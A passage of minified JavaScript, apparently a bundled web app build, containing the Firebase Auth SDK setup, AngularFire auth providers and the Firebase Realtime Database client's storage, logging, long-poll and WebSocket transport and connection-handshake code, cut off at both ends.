sP(t){wn(new qe("auth",(e,{options:n})=>{let r=e.getProvider("app").getImmediate(),i=e.getProvider("heartbeat"),o=e.getProvider("app-check-internal"),{apiKey:s,authDomain:a}=r.options;D(s&&!s.includes(":"),"invalid-api-key",{appName:r.name});let c={apiKey:s,authDomain:a,clientPlatform:t,apiHost:"identitytoolkit.googleapis.com",tokenApiHost:"securetoken.googleapis.com",apiScheme:"https",sdkClientVersion:Dw(t)},l=new lf(r,i,o,c);return Xx(l,n),l},"PUBLIC").setInstantiationMode("EXPLICIT").setInstanceCreatedCallback((e,n,r)=>{e.getProvider("auth-internal").initialize()})),wn(new qe("auth-internal",e=>{let n=Sf(e.getProvider("auth").getImmediate());return(r=>new yf(r))(n)},"PRIVATE").setInstantiationMode("EXPLICIT")),ue(ow,sw,oP(t)),ue(ow,sw,"esm2017")}var aP=5*60,cP=Fh("authIdTokenMaxAge")||aP,aw=null,lP=t=>e=>p(void 0,null,function*(){let n=e&&(yield e.getIdTokenResult()),r=n&&(new Date().getTime()-Date.parse(n.issuedAtTime))/1e3;if(r&&r>cP)return;let i=n?.token;aw!==i&&(aw=i,yield fetch(t,{method:i?"POST":"DELETE",headers:i?{Authorization:`Bearer ${i}`}:{}}))});function Of(t=vi()){let e=zo(t,"auth");if(e.isInitialized())return e.getImmediate();let n=Af(t,{popupRedirectResolver:kw,persistence:[Ow,Aw,xf]}),r=Fh("authTokenSyncURL");if(r&&typeof isSecureContext=="boolean"&&isSecureContext){let o=new URL(r,location.origin);if(location.origin===o.origin){let s=lP(o.toString());Rf(n,s,()=>s(n.currentUser)),Nf(n,a=>s(a))}}let i=Ph("auth");return i&&Mf(n,`http://${i}`),n}function uP(){var t,e;return(e=(t=document.getElementsByTagName("head"))===null||t===void 0?void 0:t[0])!==null&&e!==void 0?e:document}Zx({loadJS(t){return new Promise((e,n)=>{let r=document.createElement("script");r.setAttribute("src",t),r.onload=e,r.onerror=i=>{let o=sr("internal-error");o.customData=i,n(o)},r.type="text/javascript",r.charset="UTF-8",uP().appendChild(r)})},gapiScript:"https://apis.google.com/js/api.js",recaptchaV2Script:"https://www.google.com/recaptcha/api.js",recaptchaEnterpriseScript:"https://www.google.com/recaptcha/enterprise.js?render="});sP("Browser");var Fw="auth",Xo=class{constructor(e){return e}},es=class{constructor(){return Go(Fw)}};var Pf=new I("angularfire2.auth-instances");function ik(t,e){let n=Mc(Fw,t,e);return n&&new Xo(n)}function ok(t){return(e,n)=>{let r=e.runOutsideAngular(()=>t(n));return new Xo(r)}}var sk={provide:es,deps:[[new Ne,Pf]]},ak={provide:Xo,useFactory:ik,deps:[[new Ne,Pf],zt]};function Lw(t,...e){return ue("angularfire",rr.full,"auth"),gt([ak,sk,{provide:Pf,useFactory:ok(t),multi:!0,deps:[Y,Me,Ii,ir,[new Ne,_i],...e]}])}var Vw=Wt(Of,!0);var jw="@firebase/database",Uw="1.0.8";var xp="";function ck(t){xp=t}var $f=class{constructor(e){this.domStorage_=e,this.prefix_="firebase:"}set(e,n){n==null?this.domStorage_.removeItem(this.prefixedName_(e)):this.domStorage_.setItem(this.prefixedName_(e),he(n))}get(e){let n=this.domStorage_.getItem(this.prefixedName_(e));return n==null?null:gi(n)}remove(e){this.domStorage_.removeItem(this.prefixedName_(e))}prefixedName_(e){return this.prefix_+e}toString(){return this.domStorage_.toString()}};var Hf=class{constructor(){this.cache_={},this.isInMemoryStorage=!0}set(e,n){n==null?delete this.cache_[e]:this.cache_[e]=n}get(e){return _t(this.cache_,e)?this.cache_[e]:null}remove(e){delete this.cache_[e]}};var _E=function(t){try{if(typeof window<"u"&&typeof window[t]<"u"){let e=window[t];return e.setItem("firebase:sentinel","cache"),e.removeItem("firebase:sentinel"),new $f(e)}}catch{}return new Hf},ur=_E("localStorage"),Wf=_E("sessionStorage");var bi=new _n("@firebase/database"),lk=function(){let t=1;return function(){return t++}}(),IE=function(t){let e=RI(t),n=new wc;n.update(e);let r=n.digest();return Ec.encodeByteArray(r)},fs=function(...t){let e="";for(let n=0;n<t.length;n++){let r=t[n];Array.isArray(r)||r&&typeof r=="object"&&typeof r.length=="number"?e+=fs.apply(null,r):typeof r=="object"?e+=he(r):e+=r,e+=" "}return e},hr=null,Bw=!0,uk=function(t,e){m(!e||t===!0||t===!1,"Can't turn on custom loggers persistently."),t===!0?(bi.logLevel=q.VERBOSE,hr=bi.log.bind(bi),e&&Wf.set("logging_enabled",!0)):typeof t=="function"?hr=t:(hr=null,Wf.remove("logging_enabled"))},Ee=function(...t){if(Bw===!0&&(Bw=!1,hr===null&&Wf.get("logging_enabled")===!0&&uk(!0)),hr){let e=fs.apply(null,t);hr(e)}},ps=function(t){return function(...e){Ee(t,...e)}},zf=function(...t){let e="FIREBASE INTERNAL ERROR: "+fs(...t);bi.error(e)},Kt=function(...t){let e=`FIREBASE FATAL ERROR: ${fs(...t)}`;throw bi.error(e),new Error(e)},Oe=function(...t){let e="FIREBASE WARNING: "+fs(...t);bi.warn(e)},dk=function(){typeof window<"u"&&window.location&&window.location.protocol&&window.location.protocol.indexOf("https:")!==-1&&Oe("Insecure Firebase access from a secure page. Please use https in calls to new Firebase().")},wE=function(t){return typeof t=="number"&&(t!==t||t===Number.POSITIVE_INFINITY||t===Number.NEGATIVE_INFINITY)},hk=function(t){if(yt()||document.readyState==="complete")t();else{let e=!1,n=function(){if(!document.body){setTimeout(n,Math.floor(10));return}e||(e=!0,t())};document.addEventListener?(document.addEventListener("DOMContentLoaded",n,!1),window.addEventListener("load",n,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",()=>{document.readyState==="complete"&&n()}),window.attachEvent("onload",n))}},Ti="[MIN_NAME]",fr="[MAX_NAME]",Oi=function(t,e){if(t===e)return 0;if(t===Ti||e===fr)return-1;if(e===Ti||t===fr)return 1;{let n=$w(t),r=$w(e);return n!==null?r!==null?n-r===0?t.length-e.length:n-r:-1:r!==null?1:t<e?-1:1}},fk=function(t,e){return t===e?0:t<e?-1:1},ts=function(t,e){if(e&&t in e)return e[t];throw new Error("Missing required key ("+t+") in object: "+he(e))},Op=function(t){if(typeof t!="object"||t===null)return he(t);let e=[];for(let r in t)e.push(r);e.sort();let n="{";for(let r=0;r<e.length;r++)r!==0&&(n+=","),n+=he(e[r]),n+=":",n+=Op(t[e[r]]);return n+="}",n},EE=function(t,e){let n=t.length;if(n<=e)return[t];let r=[];for(let i=0;i<n;i+=e)i+e>n?r.push(t.substring(i,n)):r.push(t.substring(i,i+e));return r};function Ze(t,e){for(let n in t)t.hasOwnProperty(n)&&e(n,t[n])}var CE=function(t){m(!wE(t),"Invalid JSON number");let e=11,n=52,r=(1<<e-1)-1,i,o,s,a,c;t===0?(o=0,s=0,i=1/t===-1/0?1:0):(i=t<0,t=Math.abs(t),t>=Math.pow(2,1-r)?(a=Math.min(Math.floor(Math.log(t)/Math.LN2),r),o=a+r,s=Math.round(t*Math.pow(2,n-a)-Math.pow(2,n))):(o=0,s=Math.round(t/Math.pow(2,1-r-n))));let l=[];for(c=n;c;c-=1)l.push(s%2?1:0),s=Math.floor(s/2);for(c=e;c;c-=1)l.push(o%2?1:0),o=Math.floor(o/2);l.push(i?1:0),l.reverse();let u=l.join(""),d="";for(c=0;c<64;c+=8){let h=parseInt(u.substr(c,8),2).toString(16);h.length===1&&(h="0"+h),d=d+h}return d.toLowerCase()},pk=function(){return!!(typeof window=="object"&&window.chrome&&window.chrome.extension&&!/^chrome/.test(window.location.href))},gk=function(){return typeof Windows=="object"&&typeof Windows.UI=="object"};var mk=new RegExp("^-?(0*)\\d{1,10}$"),vk=-2147483648,yk=2147483647,$w=function(t){if(mk.test(t)){let e=Number(t);if(e>=vk&&e<=yk)return e}return null},Pi=function(t){try{t()}catch(e){setTimeout(()=>{let n=e.stack||"";throw Oe("Exception was thrown by user callback.",n),e},Math.floor(0))}},_k=function(){return(typeof window=="object"&&window.navigator&&window.navigator.userAgent||"").search(/googlebot|google webmaster tools|bingbot|yahoo! slurp|baiduspider|yandexbot|duckduckbot/i)>=0},ss=function(t,e){let n=setTimeout(t,e);return typeof n=="number"&&typeof Deno<"u"&&Deno.unrefTimer?Deno.unrefTimer(n):typeof n=="object"&&n.unref&&n.unref(),n};var Gf=class{constructor(e,n){this.appName_=e,this.appCheckProvider=n,this.appCheck=n?.getImmediate({optional:!0}),this.appCheck||n?.get().then(r=>this.appCheck=r)}getToken(e){return this.appCheck?this.appCheck.getToken(e):new Promise((n,r)=>{setTimeout(()=>{this.appCheck?this.getToken(e).then(n,r):n(null)},0)})}addTokenChangeListener(e){var n;(n=this.appCheckProvider)===null||n===void 0||n.get().then(r=>r.addTokenListener(e))}notifyForInvalidToken(){Oe(`Provided AppCheck credentials for the app named "${this.appName_}" are invalid. This usually indicates your app was not initialized correctly.`)}};var qf=class{constructor(e,n,r){this.appName_=e,this.firebaseOptions_=n,this.authProvider_=r,this.auth_=null,this.auth_=r.getImmediate({optional:!0}),this.auth_||r.onInit(i=>this.auth_=i)}getToken(e){return this.auth_?this.auth_.getToken(e).catch(n=>n&&n.code==="auth/token-not-initialized"?(Ee("Got auth/token-not-initialized error.  Treating as null token."),null):Promise.reject(n)):new Promise((n,r)=>{setTimeout(()=>{this.auth_?this.getToken(e).then(n,r):n(null)},0)})}addTokenChangeListener(e){this.auth_?this.auth_.addAuthTokenListener(e):this.authProvider_.get().then(n=>n.addAuthTokenListener(e))}removeTokenChangeListener(e){this.authProvider_.get().then(n=>n.removeAuthTokenListener(e))}notifyForInvalidToken(){let e='Provided authentication credentials for the app named "'+this.appName_+'" are invalid. This usually indicates your app was not initialized correctly. ';"credential"in this.firebaseOptions_?e+='Make sure the "credential" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':"serviceAccount"in this.firebaseOptions_?e+='Make sure the "serviceAccount" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':e+='Make sure the "apiKey" and "databaseURL" properties provided to initializeApp() match the values provided for your app at https://console.firebase.google.com/.',Oe(e)}},as=(()=>{class t{constructor(n){this.accessToken=n}getToken(n){return Promise.resolve({accessToken:this.accessToken})}addTokenChangeListener(n){n(this.accessToken)}removeTokenChangeListener(n){}notifyForInvalidToken(){}}t.OWNER="owner";return t})(),Kc="5",DE="v",bE="s",SE="r",TE="f",AE=/(console\.firebase|firebase-console-\w+\.corp|firebase\.corp)\.google\.com/,ME="ls",NE="p",Yf="ac",RE="websocket",xE="long_polling";var Zc=class{constructor(e,n,r,i,o=!1,s="",a=!1,c=!1){this.secure=n,this.namespace=r,this.webSocketOnly=i,this.nodeAdmin=o,this.persistenceKey=s,this.includeNamespaceInQueryParams=a,this.isUsingEmulator=c,this._host=e.toLowerCase(),this._domain=this._host.substr(this._host.indexOf(".")+1),this.internalHost=ur.get("host:"+e)||this._host}isCacheableHost(){return this.internalHost.substr(0,2)==="s-"}isCustomHost(){return this._domain!=="firebaseio.com"&&this._domain!=="firebaseio-demo.com"}get host(){return this._host}set host(e){e!==this.internalHost&&(this.internalHost=e,this.isCacheableHost()&&ur.set("host:"+this._host,this.internalHost))}toString(){let e=this.toURLString();return this.persistenceKey&&(e+="<"+this.persistenceKey+">"),e}toURLString(){let e=this.secure?"https://":"http://",n=this.includeNamespaceInQueryParams?`?ns=${this.namespace}`:"";return`${e}${this.host}/${n}`}};function Ik(t){return t.host!==t.internalHost||t.isCustomHost()||t.includeNamespaceInQueryParams}function OE(t,e,n){m(typeof e=="string","typeof type must == string"),m(typeof n=="object","typeof params must == object");let r;if(e===RE)r=(t.secure?"wss://":"ws://")+t.internalHost+"/.ws?";else if(e===xE)r=(t.secure?"https://":"http://")+t.internalHost+"/.lp?";else throw new Error("Unknown connection type: "+e);Ik(t)&&(n.ns=t.namespace);let i=[];return Ze(n,(o,s)=>{i.push(o+"="+s)}),r+i.join("&")}var Kf=class{constructor(){this.counters_={}}incrementCounter(e,n=1){_t(this.counters_,e)||(this.counters_[e]=0),this.counters_[e]+=n}get(){return yI(this.counters_)}};var kf={},Ff={};function Pp(t){let e=t.toString();return kf[e]||(kf[e]=new Kf),kf[e]}function wk(t,e){let n=t.toString();return Ff[n]||(Ff[n]=e()),Ff[n]}var Zf=class{constructor(e){this.onMessage_=e,this.pendingResponses=[],this.currentResponseNum=0,this.closeAfterResponse=-1,this.onClose=null}closeAfter(e,n){this.closeAfterResponse=e,this.onClose=n,this.closeAfterResponse<this.currentResponseNum&&(this.onClose(),this.onClose=null)}handleResponse(e,n){for(this.pendingResponses[e]=n;this.pendingResponses[this.currentResponseNum];){let r=this.pendingResponses[this.currentResponseNum];delete this.pendingResponses[this.currentResponseNum];for(let i=0;i<r.length;++i)r[i]&&Pi(()=>{this.onMessage_(r[i])});if(this.currentResponseNum===this.closeAfterResponse){this.onClose&&(this.onClose(),this.onClose=null);break}this.currentResponseNum++}}};var Hw="start",Ek="close",Ck="pLPCommand",Dk="pRTLPCB",PE="id",kE="pw",FE="ser",bk="cb",Sk="seg",Tk="ts",Ak="d",Mk="dframe",LE=1870,VE=30,Nk=LE-VE,Rk=25e3,xk=3e4,Qf=class t{constructor(e,n,r,i,o,s,a){this.connId=e,this.repoInfo=n,this.applicationId=r,this.appCheckToken=i,this.authToken=o,this.transportSessionId=s,this.lastSessionId=a,this.bytesSent=0,this.bytesReceived=0,this.everConnected_=!1,this.log_=ps(e),this.stats_=Pp(n),this.urlFn=c=>(this.appCheckToken&&(c[Yf]=this.appCheckToken),OE(n,xE,c))}open(e,n){this.curSegmentNum=0,this.onDisconnect_=n,this.myPacketOrderer=new Zf(e),this.isClosed_=!1,this.connectTimeoutTimer_=setTimeout(()=>{this.log_("Timed out trying to connect."),this.onClosed_(),this.connectTimeoutTimer_=null},Math.floor(xk)),hk(()=>{if(this.isClosed_)return;this.scriptTagHolder=new Jf((...o)=>{let[s,a,c,l,u]=o;if(this.incrementIncomingBytes_(o),!!this.scriptTagHolder)if(this.connectTimeoutTimer_&&(clearTimeout(this.connectTimeoutTimer_),this.connectTimeoutTimer_=null),this.everConnected_=!0,s===Hw)this.id=a,this.password=c;else if(s===Ek)a?(this.scriptTagHolder.sendNewPolls=!1,this.myPacketOrderer.closeAfter(a,()=>{this.onClosed_()})):this.onClosed_();else throw new Error("Unrecognized command received: "+s)},(...o)=>{let[s,a]=o;this.incrementIncomingBytes_(o),this.myPacketOrderer.handleResponse(s,a)},()=>{this.onClosed_()},this.urlFn);let r={};r[Hw]="t",r[FE]=Math.floor(Math.random()*1e8),this.scriptTagHolder.uniqueCallbackIdentifier&&(r[bk]=this.scriptTagHolder.uniqueCallbackIdentifier),r[DE]=Kc,this.transportSessionId&&(r[bE]=this.transportSessionId),this.lastSessionId&&(r[ME]=this.lastSessionId),this.applicationId&&(r[NE]=this.applicationId),this.appCheckToken&&(r[Yf]=this.appCheckToken),typeof location<"u"&&location.hostname&&AE.test(location.hostname)&&(r[SE]=TE);let i=this.urlFn(r);this.log_("Connecting via long-poll to "+i),this.scriptTagHolder.addTag(i,()=>{})})}start(){this.scriptTagHolder.startLongPoll(this.id,this.password),this.addDisconnectPingFrame(this.id,this.password)}static forceAllow(){t.forceAllow_=!0}static forceDisallow(){t.forceDisallow_=!0}static isAvailable(){return yt()?!1:t.forceAllow_?!0:!t.forceDisallow_&&typeof document<"u"&&document.createElement!=null&&!pk()&&!gk()}markConnectionHealthy(){}shutdown_(){this.isClosed_=!0,this.scriptTagHolder&&(this.scriptTagHolder.close(),this.scriptTagHolder=null),this.myDisconnFrame&&(document.body.removeChild(this.myDisconnFrame),this.myDisconnFrame=null),this.connectTimeoutTimer_&&(clearTimeout(this.connectTimeoutTimer_),this.connectTimeoutTimer_=null)}onClosed_(){this.isClosed_||(this.log_("Longpoll is closing itself"),this.shutdown_(),this.onDisconnect_&&(this.onDisconnect_(this.everConnected_),this.onDisconnect_=null))}close(){this.isClosed_||(this.log_("Longpoll is being closed."),this.shutdown_())}send(e){let n=he(e);this.bytesSent+=n.length,this.stats_.incrementCounter("bytes_sent",n.length);let r=xh(n),i=EE(r,Nk);for(let o=0;o<i.length;o++)this.scriptTagHolder.enqueueSegment(this.curSegmentNum,i.length,i[o]),this.curSegmentNum++}addDisconnectPingFrame(e,n){if(yt())return;this.myDisconnFrame=document.createElement("iframe");let r={};r[Mk]="t",r[PE]=e,r[kE]=n,this.myDisconnFrame.src=this.urlFn(r),this.myDisconnFrame.style.display="none",document.body.appendChild(this.myDisconnFrame)}incrementIncomingBytes_(e){let n=he(e).length;this.bytesReceived+=n,this.stats_.incrementCounter("bytes_received",n)}},Jf=class t{constructor(e,n,r,i){if(this.onDisconnect=r,this.urlFn=i,this.outstandingRequests=new Set,this.pendingSegs=[],this.currentSerial=Math.floor(Math.random()*1e8),this.sendNewPolls=!0,yt())this.commandCB=e,this.onMessageCB=n;else{this.uniqueCallbackIdentifier=lk(),window[Ck+this.uniqueCallbackIdentifier]=e,window[Dk+this.uniqueCallbackIdentifier]=n,this.myIFrame=t.createIFrame_();let o="";this.myIFrame.src&&this.myIFrame.src.substr(0,11)==="javascript:"&&(o='<script>document.domain="'+document.domain+'";<\/script>');let s="<html><body>"+o+"</body></html>";try{this.myIFrame.doc.open(),this.myIFrame.doc.write(s),this.myIFrame.doc.close()}catch(a){Ee("frame writing exception"),a.stack&&Ee(a.stack),Ee(a)}}}static createIFrame_(){let e=document.createElement("iframe");if(e.style.display="none",document.body){document.body.appendChild(e);try{e.contentWindow.document||Ee("No IE domain setting required")}catch{let r=document.domain;e.src="javascript:void((function(){document.open();document.domain='"+r+"';document.close();})())"}}else throw"Document body has not initialized. Wait to initialize Firebase until after the document is ready.";return e.contentDocument?e.doc=e.contentDocument:e.contentWindow?e.doc=e.contentWindow.document:e.document&&(e.doc=e.document),e}close(){this.alive=!1,this.myIFrame&&(this.myIFrame.doc.body.textContent="",setTimeout(()=>{this.myIFrame!==null&&(document.body.removeChild(this.myIFrame),this.myIFrame=null)},Math.floor(0)));let e=this.onDisconnect;e&&(this.onDisconnect=null,e())}startLongPoll(e,n){for(this.myID=e,this.myPW=n,this.alive=!0;this.newRequest_(););}newRequest_(){if(this.alive&&this.sendNewPolls&&this.outstandingRequests.size<(this.pendingSegs.length>0?2:1)){this.currentSerial++;let e={};e[PE]=this.myID,e[kE]=this.myPW,e[FE]=this.currentSerial;let n=this.urlFn(e),r="",i=0;for(;this.pendingSegs.length>0&&this.pendingSegs[0].d.length+VE+r.length<=LE;){let s=this.pendingSegs.shift();r=r+"&"+Sk+i+"="+s.seg+"&"+Tk+i+"="+s.ts+"&"+Ak+i+"="+s.d,i++}return n=n+r,this.addLongPollTag_(n,this.currentSerial),!0}else return!1}enqueueSegment(e,n,r){this.pendingSegs.push({seg:e,ts:n,d:r}),this.alive&&this.newRequest_()}addLongPollTag_(e,n){this.outstandingRequests.add(n);let r=()=>{this.outstandingRequests.delete(n),this.newRequest_()},i=setTimeout(r,Math.floor(Rk)),o=()=>{clearTimeout(i),r()};this.addTag(e,o)}addTag(e,n){yt()?this.doNodeLongPoll(e,n):setTimeout(()=>{try{if(!this.sendNewPolls)return;let r=this.myIFrame.doc.createElement("script");r.type="text/javascript",r.async=!0,r.src=e,r.onload=r.onreadystatechange=function(){let i=r.readyState;(!i||i==="loaded"||i==="complete")&&(r.onload=r.onreadystatechange=null,r.parentNode&&r.parentNode.removeChild(r),n())},r.onerror=()=>{Ee("Long-poll script failed to load: "+e),this.sendNewPolls=!1,this.close()},this.myIFrame.doc.body.appendChild(r)}catch{}},Math.floor(1))}};var Ok=16384,Pk=45e3,Qc=null;typeof MozWebSocket<"u"?Qc=MozWebSocket:typeof WebSocket<"u"&&(Qc=WebSocket);var ns=(()=>{class t{constructor(n,r,i,o,s,a,c){this.connId=n,this.applicationId=i,this.appCheckToken=o,this.authToken=s,this.keepaliveTimer=null,this.frames=null,this.totalFrames=0,this.bytesSent=0,this.bytesReceived=0,this.log_=ps(this.connId),this.stats_=Pp(r),this.connURL=t.connectionURL_(r,a,c,o,i),this.nodeAdmin=r.nodeAdmin}static connectionURL_(n,r,i,o,s){let a={};return a[DE]=Kc,!yt()&&typeof location<"u"&&location.hostname&&AE.test(location.hostname)&&(a[SE]=TE),r&&(a[bE]=r),i&&(a[ME]=i),o&&(a[Yf]=o),s&&(a[NE]=s),OE(n,RE,a)}open(n,r){this.onDisconnect=r,this.onMessage=n,this.log_("Websocket connecting to "+this.connURL),this.everConnected_=!1,ur.set("previous_websocket_failure",!0);try{let i;if(yt()){let o=this.nodeAdmin?"AdminNode":"Node";i={headers:{"User-Agent":`Firebase/${Kc}/${xp}/${process.platform}/${o}`,"X-Firebase-GMPID":this.applicationId||""}},this.authToken&&(i.headers.Authorization=`Bearer ${this.authToken}`),this.appCheckToken&&(i.headers["X-Firebase-AppCheck"]=this.appCheckToken);let s=process.env,a=this.connURL.indexOf("wss://")===0?s.HTTPS_PROXY||s.https_proxy:s.HTTP_PROXY||s.http_proxy;a&&(i.proxy={origin:a})}this.mySock=new Qc(this.connURL,[],i)}catch(i){this.log_("Error instantiating WebSocket.");let o=i.message||i.data;o&&this.log_(o),this.onClosed_();return}this.mySock.onopen=()=>{this.log_("Websocket connected."),this.everConnected_=!0},this.mySock.onclose=()=>{this.log_("Websocket connection was disconnected."),this.mySock=null,this.onClosed_()},this.mySock.onmessage=i=>{this.handleIncomingFrame(i)},this.mySock.onerror=i=>{this.log_("WebSocket error.  Closing connection.");let o=i.message||i.data;o&&this.log_(o),this.onClosed_()}}start(){}static forceDisallow(){t.forceDisallow_=!0}static isAvailable(){let n=!1;if(typeof navigator<"u"&&navigator.userAgent){let r=/Android ([0-9]{0,}\.[0-9]{0,})/,i=navigator.userAgent.match(r);i&&i.length>1&&parseFloat(i[1])<4.4&&(n=!0)}return!n&&Qc!==null&&!t.forceDisallow_}static previouslyFailed(){return ur.isInMemoryStorage||ur.get("previous_websocket_failure")===!0}markConnectionHealthy(){ur.remove("previous_websocket_failure")}appendFrame_(n){if(this.frames.push(n),this.frames.length===this.totalFrames){let r=this.frames.join("");this.frames=null;let i=gi(r);this.onMessage(i)}}handleNewFrameCount_(n){this.totalFrames=n,this.frames=[]}extractFrameCount_(n){if(m(this.frames===null,"We already have a frame buffer"),n.length<=6){let r=Number(n);if(!isNaN(r))return this.handleNewFrameCount_(r),null}return this.handleNewFrameCount_(1),n}handleIncomingFrame(n){if(this.mySock===null)return;let r=n.data;if(this.bytesReceived+=r.length,this.stats_.incrementCounter("bytes_received",r.length),this.resetKeepAlive(),this.frames!==null)this.appendFrame_(r);else{let i=this.extractFrameCount_(r);i!==null&&this.appendFrame_(i)}}send(n){this.resetKeepAlive();let r=he(n);this.bytesSent+=r.length,this.stats_.incrementCounter("bytes_sent",r.length);let i=EE(r,Ok);i.length>1&&this.sendString_(String(i.length));for(let o=0;o<i.length;o++)this.sendString_(i[o])}shutdown_(){this.isClosed_=!0,this.keepaliveTimer&&(clearInterval(this.keepaliveTimer),this.keepaliveTimer=null),this.mySock&&(this.mySock.close(),this.mySock=null)}onClosed_(){this.isClosed_||(this.log_("WebSocket is closing itself"),this.shutdown_(),this.onDisconnect&&(this.onDisconnect(this.everConnected_),this.onDisconnect=null))}close(){this.isClosed_||(this.log_("WebSocket is being closed"),this.shutdown_())}resetKeepAlive(){clearInterval(this.keepaliveTimer),this.keepaliveTimer=setInterval(()=>{this.mySock&&this.sendString_("0"),this.resetKeepAlive()},Math.floor(Pk))}sendString_(n){try{this.mySock.send(n)}catch(r){this.log_("Exception thrown from WebSocket.send():",r.message||r.data,"Closing connection."),setTimeout(this.onClosed_.bind(this),0)}}}t.responsesRequiredToBeHealthy=2,t.healthyTimeout=3e4;return t})(),kk=(()=>{class t{constructor(n){this.initTransports_(n)}static get ALL_TRANSPORTS(){return[Qf,ns]}static get IS_TRANSPORT_INITIALIZED(){return this.globalTransportInitialized_}initTransports_(n){let r=ns&&ns.isAvailable(),i=r&&!ns.previouslyFailed();if(n.webSocketOnly&&(r||Oe("wss:// URL used, but browser isn't known to support websockets.  Trying anyway."),i=!0),i)this.transports_=[ns];else{let o=this.transports_=[];for(let s of t.ALL_TRANSPORTS)s&&s.isAvailable()&&o.push(s);t.globalTransportInitialized_=!0}}initialTransport(){if(this.transports_.length>0)return this.transports_[0];throw new Error("No transports available")}upgradeTransport(){return this.transports_.length>1?this.transports_[1]:null}}t.globalTransportInitialized_=!1;return t})(),Fk=6e4,Lk=5e3,Vk=10*1024,jk=100*1024,Lf="t",Ww="d",Uk="s",zw="r",Bk="e",Gw="o",qw="a",Yw="n",Kw="p",$k="h",Xf=class{constructor(e,n,r,i,o,s,a,c,l,u){this.id=e,this.repoInfo_=n,this.applicationId_=r,this.appCheckToken_=i,this.authToken_=o,this.onMessage_=s,this.onReady_=a,this.onDisconnect_=c,this.onKill_=l,this.lastSessionId=u,this.connectionCount=0,this.pendingDataMessages=[],this.state_=0,this.log_=ps("c:"+this.id+":"),this.transportManager_=new kk(n),this.log_("Connection created"),this.start_()}start_(){let e=this.transportManager_.initialTransport();this.conn_=new e(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,null,this.lastSessionId),this.primaryResponsesRequired_=e.responsesRequiredToBeHealthy||0;let n=this.connReceiver_(this.conn_),r=this.disconnReceiver_(this.conn_);this.tx_=this.conn_,this.rx_=this.conn_,this.secondaryConn_=null,this.isHealthy_=!1,setTimeout(()=>{this.conn_&&this.conn_.open(n,r)},Math.floor(0));let i=e.healthyTimeout||0;i>0&&(this.healthyTimeout_=ss(()=>{this.healthyTimeout_=null,this.isHealthy_||(this.conn_&&this.conn_.bytesReceived>jk?(this.log_("Connection exceeded healthy timeout but has received "+this.conn_.bytesReceived+" bytes.  Marking connection healthy."),this.isHealthy_=!0,this.conn_.markConnectionHealthy()):this.conn_&&this.conn_.bytesSent>Vk?this.log_("Connection exceeded healthy timeout but has sent "+this.conn_.bytesSent+" bytes.  Leaving connection alive."):(this.log_("Closing unhealthy connection after timeout."),this.close()))},Math.floor(i)))}nextTransportId_(){return"c:"+this.id+":"+this.connectionCount++}disconnReceiver_(e){return n=>{e===this.conn_?this.onConnectionLost_(n):e===this.secondaryConn_?(this.log_("Secondary connection lost."),this.onSecondaryConnectionLost_()):this.log_("closing an old connection")}}connReceiver_(e){return n=>{this.state_!==2&&(e===this.rx_?this.onPrimaryMessageReceived_(n):e===this.secondaryConn_?this.onSecondaryMessageReceived_(n):this.log_("message on old connection"))}}sendRequest(e){let n={t:"d",d:e};this.sendData_(n)}tryCleanupConnection(){this.tx_===this.secondaryConn_&&this.rx_===this.secondaryConn_&&(this.log_("cleaning up and promoting a connection: "+this.secondaryConn_.connId),this.conn_=this.secondaryConn_,this.secondaryConn_=null)}onSecondaryControl_(e){if(Lf in e){let n=e[Lf];n===qw?this.upgradeIfSecondaryHealthy_():n===zw?(this.log_("Got a reset on secondary, closing it"),this.secondaryConn_.close(),(this.tx_===this.secondaryConn_||this.rx_===this.secondaryConn_)&&this.close()):n===Gw&&(this.log_("got pong on secondary."),this.secondaryResponsesRequired_--,this.upgradeIfSecondaryHealthy_())}}onSecondaryMessageReceived_(e){let n=ts("t",e),r=ts("d",e);if(n==="c")this.onSecondaryControl_(r);else if(n==="d")this.pendingDataMessages.push(r);else throw new Error("Unknown protocol layer: "+n)}upgradeIfSecondaryHealthy_(){this.secondaryResponsesRequired_<=0?(this.log_("Secondary connection is healthy."),this.isHealthy_=!0,this.secondaryConn_.markConnectionHealthy(),this.proceedWithUpgrade_()):(this.log_("sending ping on secondary."),this.secondaryConn_.send({t:"c",d:{t:Kw,d:{}}}))}proceedWithUpgrade_(){this.secondaryConn_.start(),this.log_("sending client ack on secondary"),this.secondaryConn_.send({t:"c",d:{t:qw,d:{}}}),this.log_("Ending transmission on primary"),this.conn_.send({t:"c",d:{t:Yw,d:{}}}),this.tx_=this.secondaryConn_,this.tryCleanupConnection()}onPrimaryMessageReceived_(e){let n=ts("t",e),r=ts("d",e);n==="c"?this.onControl_(r):n==="d"&&this.onDataMessage_(r)}onDataMessage_(e){this.onPrimaryResponse_(),this.onMessage_(e)}onPrimaryResponse_(){this.isHealthy_||(this.primaryResponsesRequired_--,this.primaryResponsesRequired_<=0&&(this.log_("Primary connection is healthy."),this.isHealthy_=!0,this.conn_.markConnectionHealthy()))}onControl_(e){let n=ts(Lf,e);if(Ww in e){let r=e[Ww];if(n===$k){let i=Object.assign({},r);this.repoInfo_.isUsingEmulator&&(i.h=this.repoInfo_.host),this.onHandshake_(i)}else if(n===Yw){this.log_("recvd end transmission on primary"),this.rx_=this.secondaryConn_;for(let i=0;i<this.pendingDataMessages.length;++i)this.onDataMessage_(this.pendingDataMessages[i]);this.pendingDataMessages=[],this.tryCleanupConnection()}else n===Uk?this.onConnectionShutdown_(r):n===zw?this.onReset_(r):n===Bk?zf("Server Error: "+r):n===Gw?(this.log_("got pong on primary."),this.onPrimaryResponse_(),this.sendPingOnPrimaryIfNecessary_()):zf("Unknown control packet command: "+n)}}onHandshake_(e){let n=e.ts,r=e.v,i=e.h;this.sessionId=e.s,this.repoInfo_.host=i,this.state_===0&&(this.conn_.start(),this.onConnectionEstablished_(this.conn_,n),Kc!==r&&Oe("Protocol version mismatch detected"),this.tryStartUpgrade_())}tryStartUpgrade_(){let e=this.transportManager_.upgradeTransport();e&&this.startUpgrade_(e)}startUpgrade_(e){this.secondaryConn_=new e(this.nextTransportId_(),this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,this.sessionId),this.secondaryResponsesRequired_=e.responsesRequiredToBeHealthy||0;let n=this.connReceiver_(this.secondaryConn_),r=this.disconnReceiver_(this.secondaryConn_);this.secondaryConn_.open(n,r),ss(()=>{this.secondaryConn_&&(this.log_("Timed out 